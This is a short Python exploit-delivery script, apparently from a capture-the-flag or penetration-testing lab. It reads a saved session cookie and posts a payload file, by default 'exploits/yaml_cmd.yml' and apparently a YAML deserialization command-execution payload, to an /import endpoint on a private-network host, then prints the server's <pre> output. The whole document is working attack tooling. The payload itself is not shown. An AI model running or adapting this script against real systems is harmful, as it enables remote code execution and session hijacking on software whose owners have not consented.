import sys, requests

URL = "http://10.64.132.157/import"
payload_file = sys.argv[1] if len(sys.argv) > 1 else "exploits/yaml_cmd.yml"
cookie = open("web/cookies.txt").read()
# extract session cookie value
import http.cookiejar, re
m = re.search(r"session\s+(\S+)", cookie)
sess = m.group(1) if m else ""
data = open(payload_file).read()
r = requests.post(URL, data={"playlist": data}, cookies={"session": sess}, timeout=25)
print("STATUS:", r.status_code, "SIZE:", len(r.text))
# print the loaded/error pre
import re as _re
for m in _re.findall(r"<pre>(.*?)</pre>", r.text, _re.S):
    print("PRE>>>", m[:3000])
